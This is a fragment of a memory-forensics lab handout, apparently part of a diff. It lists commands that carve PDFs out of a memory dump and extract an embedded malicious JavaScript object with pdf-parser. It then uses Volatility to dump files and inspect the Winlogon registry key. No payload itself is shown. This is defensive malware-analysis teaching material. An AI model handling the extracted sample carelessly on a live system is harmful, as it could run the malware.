+foremost -i ~/Desktop/volatility/dump/1752.dmp -t pdf -o output/pdf/
+cd ~/Desktop/volatility/output/pdf/
+cat audit.txt
+cd pdf
+ls
+grep -i javascript *.pdf
+
+
+
+cd ~/Desktop/volatility/output/pdf/
+wget http://didierstevens.com/files/software/pdf-parser_V0_6_4.zip
+unzip pdf-parser_V0_6_4.zip
+python pdf-parser.py -s javascript --raw pdf/00601560.pdf
+python pdf-parser.py --object 11 00600328.pdf
+python pdf-parser.py --object 1054 --raw --filter 00601560.pdf > malicious.js
+
+cat malicious.js
+-----------------------------------------------------------------------
+
+
+
+
+*****Sorry - no time to cover javascript de-obfuscation today*****
+
+
+
+
+---------------------------Type This-----------------------------------
+cd ~/Desktop/volatility
+mkdir files2/
+python vol.py -f ~/Desktop/hn_forensics.vmem dumpfiles -D files2/
+python vol.py hivescan -f ~/Desktop/hn_forensics.vmem									
+python vol.py printkey -o 0xe1526748 -f ~/Desktop/hn_forensics.vmem Microsoft "Windows NT" CurrentVersion Winlogon	
+-----------------------------------------------------------------------
